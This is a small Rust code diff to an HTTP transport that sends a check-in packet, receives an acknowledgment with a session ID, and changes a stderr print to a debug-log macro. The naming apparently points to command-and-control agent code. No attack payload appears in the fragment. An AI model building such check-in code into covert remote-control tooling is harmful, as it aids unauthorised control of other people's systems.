@@ -90,7 +90,7 @@ impl HttpTransport {
             .post_packet(&checkin_pkt)
             .await?
             .ok_or_else(|| anyhow!("no checkin_ack"))?;
-        eprintln!(
+        crate::dbg_log!(
             "[+] HTTP registered, session: {}",
             ack.data["session_id"].as_str().unwrap_or("?")
         );
